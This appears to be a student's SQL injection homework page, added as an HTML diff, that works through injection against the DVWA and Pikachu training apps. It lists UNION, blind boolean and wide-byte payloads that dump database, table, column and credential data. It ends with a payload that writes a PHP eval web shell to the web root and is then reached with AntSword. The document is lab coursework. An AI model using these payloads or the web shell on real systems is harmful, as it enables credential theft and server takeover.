@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>第7周作业</title>
+</head>
+<body>
+    <h3>1. 分别在前端和后端使用 Union 注入实现“dvwa 数据库 -user 表 - 字段 -first_name 数据”的注入过程，写清楚注入步骤。</h3>
+    <p>dvwa 数据库：1' union select database(),version()#</p>
+    <p>user 表：1' union select 1,group_concat(table_name) from information_schema.tables where table_schema ='dvwa'#</p>
+    <p>字段 -first_name：1' UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'#</p>
+    <p>数据：1' union select user,password from users#</p>
+
+    <h3>2. 分别在前端和后端使用报错注入实现“dvwa 数据库 -user 表 - 字段”的注入过程，写清楚注入步骤，并回答下列关于报错注入的问题：</h3>
+    <li>在 extractvalue 函数中，为什么’~'写在参数 1 的位置不报错，而写在参数 2 的位置报错？</li>
+    <p>~无法作为路径名称存在</p>
+    <li>报错注入中，为什么要突破单引号的限制，如何突破？</li>
+    <li>在报错注入过程中，为什么要进行报错，是哪种类型的报错？</li>
+
+    <h3>3. 任选布尔盲注或者时间盲注在前端和后端实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤。</h3>
+    <p>判断数据库名称的长度（二分法思维）</p>
+    <p>1' and length(database())>10;# MISSING</p>
+    <p>1' and length(database())>5;# MISSING</p>
+    <p>1' and length(database())>3;# exists</p>
+    <p>1' and length(database())=4;# exists</p>
+    <p>可判断出当前所连接数据库名称的长度=4</p>
+    <br>
+    <p>判断数据库名称的字符组成元素</p>
+    <p>在给定的字符串中利用substr()函数，从指定位置开始截取指定长度的字符串，分离出数据库名称的每个位置的元素，并分别将其转换为ASCII码，与对应的ASCII码值比较大小，找到比值相同时的字符，然后逐个击破。</p>
+    <p>1' and ascii(substr(database(),1,1))>88;# exists</p>
+    <p>1' and ascii(substr(database(),1,1))>98;# exists</p>
+    <p>1' and ascii(substr(database(),1,1))>100;# MISSING</p>
+    <p>1' and ascii(substr(database(),1,1))=100;# exists</p>
+    <p>数据库名称的首位字符对应的ASCII码为100，查询是字母 d</p>
+    <p>类似以上操作，分别猜解第2/3/4位元素的字符：</p>
+    <p>1' and ascii(substr(database(),2,1))=118;# 第2位字符为 v</p>
+    <p>1' and ascii(substr(database(),3,1))=119;# 第3位字符为 w</p>
+    <p>1' and ascii(substr(database(),4,1))=97;# 第4位字符为 a</p>
+    <p>从而，获取到当前连接数据库的名称为：dvwa</p>
+    <br>
+    <p>猜解数据库中的表名</p>
+    <p>1' and (select count(table_name) from information_schema.tables where table_schema=database())>10;# MISSING</p>
+    <p>1' and (select count(table_name) from information_schema.tables where table_schema=database())>5;# MISSING</p>
+    <p>1' and (select count(table_name) from information_schema.tables where table_schema=database())>2;# MISSING</p>
+    <p>1' and (select count(table_name) from information_schema.tables where table_schema=database())=2;# exists</p>
+    <p>dvwa数据库中表的个数=2</p>
+    <p>猜解dvwa数据库中第一张表的名称字符长度=9</p>
+    <p>1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>10;# MISSING</p>
+    <p>1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>5;# exists</p>
+    <p>1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>8;# exists</p>
+    <p>1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9;# exists</p>
+    <p>依次取出dvwa数据库第一张表的第1/2/.../9个字符分别猜解：</p>
+    <p>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103;# MISSING</p>
+    <p>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=102;# MISSING</p>
+    <p>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103;# exists</p>
+    <p>dvwa数据库第一张表的第1个字符的ASCII码=103，对应的字符为g</p>
+    <p>依次猜解出其他位置的字符分别为：u、e、s、t、b、o、o、k</p>
+    <p>从而dvwa数据库第一张表的名称为：guestbook</p>
+    <p>猜解出dvwa数据库第二张表的名称为：users</p>
+
+    <h3>4. 利用宽字节注入实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤。</h3>
+    <p>库名：%df' union select database(),version()#</p>
+    <p>表名：%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema ='pikachu'#</p>
+    <p>字段：%df' union SELECT 1,group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'#</p>
+
+    <h3>5. 利用 SQL 注入实现 DVWA 站点的 Getshell，写清楚攻击步骤。</h3>
+    <p>在 DVWA Low 等级的 SQL Injection中输入</p>
+    <p>' union select 1,"<?php eval($_POST['a']);" into outfile '/var/www/html/shell2.php</p>
+    <p>可以成功访问，查看目录，用蚁剑链接</p>
+</body>
+</html>
